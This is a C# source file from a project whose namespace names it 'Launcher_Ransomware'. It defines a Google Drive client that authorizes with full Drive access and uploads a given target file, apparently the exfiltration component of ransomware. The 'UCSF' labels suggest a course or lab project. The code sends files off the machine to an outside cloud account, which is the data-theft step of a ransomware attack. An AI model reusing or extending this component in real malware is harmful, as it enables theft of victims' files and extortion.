using Google.Apis.Auth.OAuth2;
using Google.Apis.Drive.v3;
using Google.Apis.Services;
using Google.Apis.Util.Store;
using System.Threading;
using System.Web;

namespace Launcher_Ransomware
{
    public class GoogleDriveAPI
    {
        //Defining the scope
        //DriveService.Scope.Drive: View and manage the files in your Google Drive.
        public static string[] Scopes = { DriveService.Scope.Drive };

        private static DriveService GetService()
        {
            // Get the google drive client ID
            var clientId = ConfigurationManager.AppSettings["GoogleAPI.ClientId"];

            // Get the google drive client secret for authorization
            var clientSecret = ConfigurationManager.AppSettings["GoogleAPI.ClientSecret"];

            var credential = GoogleWebAuthorizationBroker.AuthorizeAsync(new ClientSecrets
            {
                ClientId = clientId,
                ClientSecret = clientSecret
            }, 
            Scopes, Environment.UserName, CancellationToken.None, new FileDataStore("GoogleAPIToken")).Result;

            //create Drive API service.
            DriveService service = new(new BaseClientService.Initializer()
            {
                HttpClientInitializer = credential,
                ApplicationName = "UCSFProjectAPI",
            });

            return service;
        }

        public static async Task FileUpload(string target_file)
        {
            DriveService service = GetService();

            // Define the file body and data
            var body = new Google.Apis.Drive.v3.Data.File()
            {
                Name = Path.GetFileName(target_file),
                Description = "From UCSF",
                MimeType = MimeMapping.GetMimeMapping(target_file),
            };

            try
            {
                // Request for file uploading through the api
                FilesResource.CreateMediaUpload request;
                using (var stream = new FileStream(target_file, FileMode.Open))
                {
                    request = service.Files.Create(body, stream, body.MimeType);
                    var response = await request.UploadAsync();
                    if (response.Status != Google.Apis.Upload.UploadStatus.Completed)
                        throw response.Exception;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Google API file upload: " + e.Message);
            }         
        }
    }
}
